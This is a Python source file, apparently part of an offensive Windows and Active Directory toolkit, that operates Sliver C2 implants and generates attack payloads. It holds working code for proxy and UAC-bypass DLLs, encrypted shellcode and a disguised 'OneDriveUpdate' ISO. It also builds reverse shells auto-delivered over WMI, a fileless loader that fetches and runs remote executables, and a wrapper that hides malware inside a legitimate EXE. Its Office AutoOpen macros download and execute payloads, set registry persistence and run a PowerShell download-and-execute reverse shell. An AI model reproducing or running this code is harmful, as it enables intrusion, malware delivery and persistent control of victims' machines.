    # ── Sliver C2 ops ─────────────────────────────────────────────────
    def _sliver() -> SliverBridge:
        return SliverBridge()

    def do_sliver_sessions():
        log("→ sliver_sessions")
        s = _sliver()
        if not s.available:
            errors.append("sliver-client not found"); return
        data['sliver_sessions'] = s.sessions()

    def do_sliver_exec():
        log("→ sliver_exec")
        sid = params.get('session_id') or ''
        if not sid:
            errors.append("session_id required"); return
        data['sliver_exec'] = _sliver().execute(
            sid, params.get('command', 'whoami /all'), timeout=timeout)

    def do_sliver_upload():
        log("→ sliver_upload")
        sid = params.get('session_id') or ''
        src = params.get('local_path') or ''
        dst = params.get('remote_path') or ''
        if not (sid and src and dst):
            errors.append("session_id, local_path, remote_path required"); return
        data['sliver_upload'] = _sliver().upload(sid, src, dst, timeout=timeout * 4)

    def do_sliver_download():
        log("→ sliver_download")
        sid = params.get('session_id') or ''
        src = params.get('remote_path') or ''
        dst = params.get('local_path') or str(output_dir / 'download')
        if not (sid and src):
            errors.append("session_id, remote_path required"); return
        data['sliver_download'] = _sliver().download(sid, src, dst, timeout=timeout * 4)

    def do_sliver_ps():
        log("→ sliver_ps")
        sid = params.get('session_id') or ''
        if not sid:
            errors.append("session_id required"); return
        data['sliver_ps'] = _sliver().ps(sid)

    def do_sliver_spawndll():
        log("→ sliver_spawndll")
        sid = params.get('session_id') or ''
        dll = params.get('dll_path') or ''
        if not (sid and dll):
            errors.append("session_id, dll_path required"); return
        data['sliver_spawndll'] = _sliver().spawndll(
            sid, dll, pid=int(params['pid']) if params.get('pid') else None)

    def do_sliver_getsystem():
        log("→ sliver_getsystem")
        sid = params.get('session_id') or ''
        if not sid:
            errors.append("session_id required"); return
        data['sliver_getsystem'] = _sliver().getsystem(sid)

    def do_sliver_registry():
        log("→ sliver_registry")
        sid = params.get('session_id') or ''
        hive = params.get('hive', 'HKCU')
        key  = params.get('reg_key') or ''
        name = params.get('reg_name') or ''
        if not (sid and key):
            errors.append("session_id, reg_key required"); return
        s = _sliver()
        if params.get('reg_value') is not None:
            data['sliver_registry'] = s.registry_write(
                sid, hive, key, name, str(params['reg_value']),
                reg_type=params.get('reg_type', 'string'))
        else:
            data['sliver_registry'] = s.registry_read(sid, hive, key, name)

    def do_sliver_whoami():
        log("→ sliver_whoami")
        sid = params.get('session_id') or ''
        if not sid:
            errors.append("session_id required"); return
        data['sliver_whoami'] = _sliver().whoami(sid)

    def do_sliver_screenshot():
        log("→ sliver_screenshot")
        sid = params.get('session_id') or ''
        if not sid:
            errors.append("session_id required"); return
        output_dir.mkdir(parents=True, exist_ok=True)
        save = str(output_dir / f"screenshot-{ts()}.png")
        data['sliver_screenshot'] = _sliver().screenshot(sid, save)

    def do_sliver_impersonate():
        log("→ sliver_impersonate")
        sid = params.get('session_id') or ''
        user = params.get('impersonate_user') or ''
        if not (sid and user):
            errors.append("session_id, impersonate_user required"); return
        data['sliver_impersonate'] = _sliver().impersonate(sid, user)

    def do_sliver_make_token():
        log("→ sliver_make_token")
        sid = params.get('session_id') or ''
        user = params.get('username') or ''
        pwd  = params.get('password') or ''
        dom  = params.get('domain') or '.'
        if not (sid and user):
            errors.append("session_id, username required"); return
        data['sliver_make_token'] = _sliver().make_token(sid, user, pwd, dom)

    # ── payload gen ops ───────────────────────────────────────────────
    def _pb() -> PayloadBuilder:
        return PayloadBuilder(Path(params.get('output_dir') or './winadsec-loot').resolve())

    def do_gen_proxy_dll():
        log("→ gen_proxy_dll")
        pb = _pb()
        dll = pb.build_proxy_dll(
            c2_host=params.get('c2_host', '192.168.1.114'),
            c2_port=int(params.get('c2_port', 9000) or 9000),
            c2_path=params.get('c2_path', '/update.bin'))
        data['gen_proxy_dll'] = {'path': str(dll), 'size': dll.stat().st_size} if dll else {'error': 'compile failed'}

    def do_gen_uac_dll():
        log("→ gen_uac_dll")
        dll = _pb().build_uac_dll(
            payload_exe=params.get('payload_exe', r'C:\Windows\Temp\svcx.exe'))
        data['gen_uac_dll'] = {'path': str(dll), 'size': dll.stat().st_size} if dll else {'error': 'compile failed'}

    def do_gen_shellcode():
        log("→ gen_shellcode")
        exe_path = params.get('exe_path') or ''
        if not exe_path:
            errors.append("exe_path required"); return
        sc = _pb().pe_to_shellcode(Path(exe_path))
        data['gen_shellcode'] = {'path': str(sc), 'size': sc.stat().st_size} if sc else {'error': 'donut failed'}

    def do_gen_payload():
        log("→ gen_payload")
        sc_path = params.get('shellcode_path') or ''
        if not sc_path:
            errors.append("shellcode_path required"); return
        key_hex = params.get('xor_key') or ''
        key = bytes.fromhex(key_hex) if key_hex else None
        enc = _pb().encrypt_shellcode(Path(sc_path), key)
        data['gen_payload'] = {'path': str(enc), 'size': enc.stat().st_size} if enc else {'error': 'encrypt failed'}

    def do_gen_sliver():
        log("→ gen_sliver")
        s = _sliver()
        if not s.available:
            errors.append("sliver-client not found"); return
        fmt = params.get('implant_format', 'exe')
        result = s.gen_implant(
            c2_host=params.get('c2_host', '192.168.1.114'),
            c2_port=int(params.get('c2_http_port', 8443) or 8443),
            fmt=fmt,
            output_path=params.get('implant_out'))
        data['gen_sliver'] = result

    def do_gen_iso():
        log("→ gen_iso")
        dll_path  = params.get('dll_path') or ''
        exe_path  = params.get('legit_exe') or ''
        if not (dll_path and exe_path):
            errors.append("dll_path and legit_exe required"); return
        iso = _pb().build_iso(Path(dll_path), Path(exe_path),
                              label=params.get('iso_label', 'OneDriveUpdate'))
        data['gen_iso'] = {'path': str(iso), 'size': iso.stat().st_size} if iso else {'error': 'xorriso failed'}

    def do_gen_all():
        log("→ gen_all")
        pb = _pb()
        result = pb.full_chain(
            c2_host=params.get('c2_host', '192.168.1.114'),
            c2_port_payload=int(params.get('c2_port', 9000) or 9000),
            sliver_exe_path=Path(params['sliver_exe']) if params.get('sliver_exe') else None,
            legit_exe_path=Path(params['legit_exe']) if params.get('legit_exe') else None)
        data['gen_all'] = result

    def do_shell():
        log("→ shell")
        lhost    = params.get('lhost') or _local_ip()
        lport    = int(params.get('lport', 4444))
        serve    = str(params.get('serve', 'true')).lower() in ('true', '1', 'yes')
        duration = int(params.get('duration', 120))
        ptype    = params.get('payload_type', 'powershell_b64')
        rs = _rs()
        if rs is None:
            errors.append("revshell module not found — check tools/network/revshell/"); return
        gen = rs.op_generate(lhost=lhost, lport=lport, shell=ptype)
        if not gen.get('success'):
            errors.append(f"payload gen failed: {gen.get('error')}"); return
        payload_cmd = list(gen['payloads'].values())[0]
        data['shell'] = {'lhost': lhost, 'lport': lport, 'payload_type': ptype,
                         'payload': payload_cmd, 'listener': f"nc -lvnp {lport}"}
        if auth.has_creds:
            rex = RemoteExec(target, auth, timeout=30)
            log(f"→ Delivering {ptype} to {target}…")
            threading.Thread(target=lambda: rex.run_command(payload_cmd), daemon=True).start()
            data['shell']['delivery'] = f'auto ({ptype} via wmiexec/WMI)'
        else:
            data['shell']['delivery'] = 'manual — creds required for auto-delivery'
            log(f"→ Copy payload: {payload_cmd[:100]}")
        log(f"→ Starting reverse shell handler on {lhost}:{lport}…")
        if serve:
            rs.op_serve([lport], lhost=lhost)
        else:
            r = rs.op_listen([lport], duration=duration, lhost=lhost)
            data['shell']['sessions']       = r.get('sessions', [])
            data['shell']['sessions_count'] = r.get('sessions_count', 0)

    def do_fileless_pe():
        log("→ fileless_pe")
        url       = params.get('url', '')
        file_type = params.get('file_type', 'exe').lower()
        method    = params.get('method', '') if file_type == 'dll' else None
        out_file  = params.get('output', 'PEloader.py')
        if not url:
            errors.append("fileless_pe requires 'url' parameter"); return
        if file_type not in ('exe', 'dll'):
            errors.append("file_type must be 'exe' or 'dll'"); return
        if file_type == 'dll' and not method:
            errors.append("fileless_pe with dll requires 'method' parameter (e.g. DLLRegisterServer)"); return
        method_str = f'"{method}"' if method else 'None'
        code = f"""import urllib.request
import pythonmemorymodule

def load_from_url(url, file_type, method=None):
    req = urllib.request.Request(url)
    buf = urllib.request.urlopen(req).read()
    if file_type == 'dll':
        dll = pythonmemorymodule.MemoryModule(data=buf, debug=True)
        if method:
            startDll = dll.get_proc_addr(method)
            assert startDll(), f"Failed to execute '{{method}}'"
    elif file_type == 'exe':
        pythonmemorymodule.MemoryModule(data=buf, debug=True)

if __name__ == "__main__":
    load_from_url("{url}", "{file_type}", {method_str})
"""
        import pathlib
        pathlib.Path(out_file).write_text(code)
        data['fileless_pe'] = {
            'output': out_file,
            'url': url,
            'file_type': file_type,
            'method': method,
            'note': 'Deploy PEloader.py to target; requires: pip install pythonmemorymodule',
        }
        log(f"→ PEloader written to {out_file}")

    def do_inject_exe():
        log("→ inject_exe")
        mal_exe   = params.get('mal_exe', '')
        legit_exe = params.get('legit_exe', '')
        if not mal_exe or not legit_exe:
            errors.append("inject_exe requires 'mal_exe' and 'legit_exe' parameters"); return
        for f in (mal_exe, legit_exe):
            if not Path(f).exists():
                errors.append(f"inject_exe: file not found: {f}"); return
        if not shutil.which('pyinstaller'):
            errors.append("inject_exe requires pyinstaller: pip install pyinstaller"); return
        import tempfile, pathlib, shutil as _shutil
        legit_name = pathlib.Path(legit_exe).stem + "-output"
        loader_src = f"""import os, sys, subprocess
def base_path(path):
    basedir = sys._MEIPASS if getattr(sys, 'frozen', None) else os.path.dirname(__file__)
    return os.path.join(basedir, path)
subprocess.Popen(base_path('{pathlib.Path(mal_exe).name}'), shell=True,
                 stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
subprocess.call(base_path('{pathlib.Path(legit_exe).name}'), shell=True)
"""
        with tempfile.NamedTemporaryFile('w', suffix='.py', delete=False) as tf:
            tf.write(loader_src)
            loader_file = tf.name
        out_dir = str(pathlib.Path(mal_exe).parent)
        cmd = [
            'pyinstaller', '--onefile', '--windowed',
            f'--add-data={mal_exe};.',
            f'--add-data={legit_exe};.',
            f'--icon={legit_exe}',
            f'--distpath={out_dir}',
            f'--name={legit_name}',
            loader_file,
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            spec = pathlib.Path(f'{legit_name}.spec')
            build = pathlib.Path('build')
            if spec.exists(): spec.unlink()
            if build.exists(): _shutil.rmtree(build)
            output_path = str(pathlib.Path(out_dir) / f'{legit_name}.exe')
            data['inject_exe'] = {
                'output': output_path,
                'mal_exe': mal_exe,
                'legit_exe': legit_exe,
                'success': result.returncode == 0,
            }
            if result.returncode != 0:
                errors.append(f"pyinstaller failed: {result.stderr[:300]}")
            else:
                log(f"→ Bundled EXE: {output_path}")
        finally:
            pathlib.Path(loader_file).unlink(missing_ok=True)

    def do_office_macros():
        log("→ office_macros")
        macro_type = params.get('macro_type', 'all').lower()
        payload_url = params.get('payload_url', 'http://YOUR-SERVER/payload.exe')
        lhost       = params.get('lhost') or _local_ip()
        lport       = int(params.get('lport', 4444))
        rev_url     = params.get('rev_url', f'http://{lhost}:{lport}/reverse.ps1')
        reg_path    = params.get('reg_path', r'C:\Path\to\macro.vbs')
        ps_command  = params.get('ps_command', 'Get-Process | Out-File -FilePath C:\\Temp\\processes.txt')

        macros = {
            'download_exec': f"""Sub AutoOpen()
    Dim objXMLHTTP As Object, objADOStream As Object, strFilePath As String
    strFilePath = Environ("TEMP") & "\\payload.exe"
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    Set objADOStream = CreateObject("ADODB.Stream")
    objXMLHTTP.Open "GET", "{payload_url}", False
    objXMLHTTP.Send
    If objXMLHTTP.Status = 200 Then
        objADOStream.Open : objADOStream.Type = 1
        objADOStream.Write objXMLHTTP.responseBody
        objADOStream.Position = 0
        objADOStream.SaveToFile strFilePath, 2
        objADOStream.Close
        CreateObject("WScript.Shell").Run strFilePath
    End If
End Sub""",
            'hidden_cmd_exec': f"""Sub AutoOpen()
    Dim command As String
    command = "cmd.exe /c bitsadmin /transfer dl {payload_url} C:\\Temp\\payload.exe && start C:\\Temp\\payload.exe"
    CreateObject("WScript.Shell").Run command, 0, False
End Sub""",
            'persistence': (
                f'Sub AutoOpen()\n'
                f'    CreateObject("WScript.Shell").RegWrite _\n'
                f'        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecVMacro", _\n'
                f'        "wscript.exe " & Chr(34) & "{reg_path}" & Chr(34)\n'
                f'End Sub'
            ),
            'pwsh_cmd': (
                f'Sub AutoOpen()\n'
                f'    Dim command As String\n'
                f'    command = "powershell.exe -WindowStyle Hidden -NoP -NonI -ExecutionPolicy Bypass -Command "'
                f' & Chr(34) & "{ps_command}" & Chr(34)\n'
                f'    CreateObject("WScript.Shell").Run command, 0, False\n'
                f'End Sub'
            ),
            'reverse_shell': (
                f'Sub AutoOpen()\n'
                f'    CreateObject("WScript.Shell").Run _\n'
                f'        "cmd.exe /c powershell -NoP -W Hidden -C " & Chr(34) & '
                f'"IEX(New-Object Net.WebClient).DownloadString(\'{rev_url}\')" & Chr(34)\n'
                f'End Sub'
            ),
        }

        selected = macros if macro_type == 'all' else {macro_type: macros[macro_type]} if macro_type in macros else {}
        if not selected:
            errors.append(f"Unknown macro_type '{macro_type}'. Options: {list(macros.keys())} + all"); return

        data['office_macros'] = {
            'macros': selected,
            'count': len(selected),
            'usage': 'Paste into Office VBA editor (Alt+F11). Macro fires on document open.',
            'note': 'Update payload_url / rev_url / reg_path / ps_command params to customise.',
        }
        log(f"→ Generated {len(selected)} Office VBA macro(s): {list(selected.keys())}")

    # ── handler dispatch ──────────────────────────────────────────────
    handlers = {
        # assessment
        'discover':         lambda: None,
        'users':            do_users,
        'groups':           do_groups,
        'shares':           do_shares,
        'passpol':          do_passpol,
        'kerberoast':       do_kerberoast,
        'asreproast':       do_asreproast,
        'spray':            do_spray,
        'vulncheck':        do_vulncheck,
        'bloodhound':       do_bloodhound,
        'loot':             do_loot,
        'secrets':          do_secrets,
        'exec':             do_exec,
        'privesc_check':    do_privesc_check,
        # post-exploitation
        'uac_bypass':       do_uac_bypass,
        'lsa_fix':          do_lsa_fix,
        'persistence':      do_persistence,
        # sliver C2
        'sliver_sessions':  do_sliver_sessions,
        'sliver_exec':      do_sliver_exec,
        'sliver_upload':    do_sliver_upload,
        'sliver_download':  do_sliver_download,
        'sliver_ps':        do_sliver_ps,
        'sliver_spawndll':  do_sliver_spawndll,
        'sliver_getsystem': do_sliver_getsystem,
        'sliver_registry':  do_sliver_registry,
        'sliver_whoami':    do_sliver_whoami,
        'sliver_screenshot':do_sliver_screenshot,
        'sliver_impersonate':do_sliver_impersonate,
        'sliver_make_token':do_sliver_make_token,
        # payload gen
        'gen_proxy_dll':    do_gen_proxy_dll,
        'gen_uac_dll':      do_gen_uac_dll,
        'gen_shellcode':    do_gen_shellcode,
        'gen_payload':      do_gen_payload,
        'gen_sliver':       do_gen_sliver,
        'gen_iso':          do_gen_iso,
        'gen_all':          do_gen_all,
        'shell':            do_shell,
        # community contribs
        'fileless_pe':      do_fileless_pe,
        'inject_exe':       do_inject_exe,
        'office_macros':    do_office_macros,
    }

    if operation == 'auto':
        for op in ['vulncheck', 'users', 'groups', 'shares', 'passpol']:
            try: handlers[op]()
            except Exception as e: errors.append(f"{op}: {e}")
        if auth.has_creds:
            for op in ['kerberoast', 'asreproast', 'bloodhound', 'loot', 'privesc_check']:
                try: handlers[op]()
                except Exception as e: errors.append(f"{op}: {e}")
            # attempt lsa_fix if LimitBlankPasswordUse flagged
            findings = (data.get('privesc') or {}).get('findings') or []
            if any('LimitBlankPasswordUse' in f.get('title','') for f in findings):
                try: do_lsa_fix()
                except Exception as e: errors.append(f"lsa_fix: {e}")
        elif params.get('userlist'):
            try: do_asreproast()
            except Exception as e: errors.append(f"asreproast: {e}")
    elif operation in handlers:
        try: handlers[operation]()
        except Exception as e:
            import traceback
            errors.append(f"{operation}: {e}")
            errors.append(traceback.format_exc()[:800])
    else:
        errors.append(f"unknown operation: {operation}")

    emit(len(errors) == 0 or bool(data), data, errors)


if __name__ == '__main__':
    main()
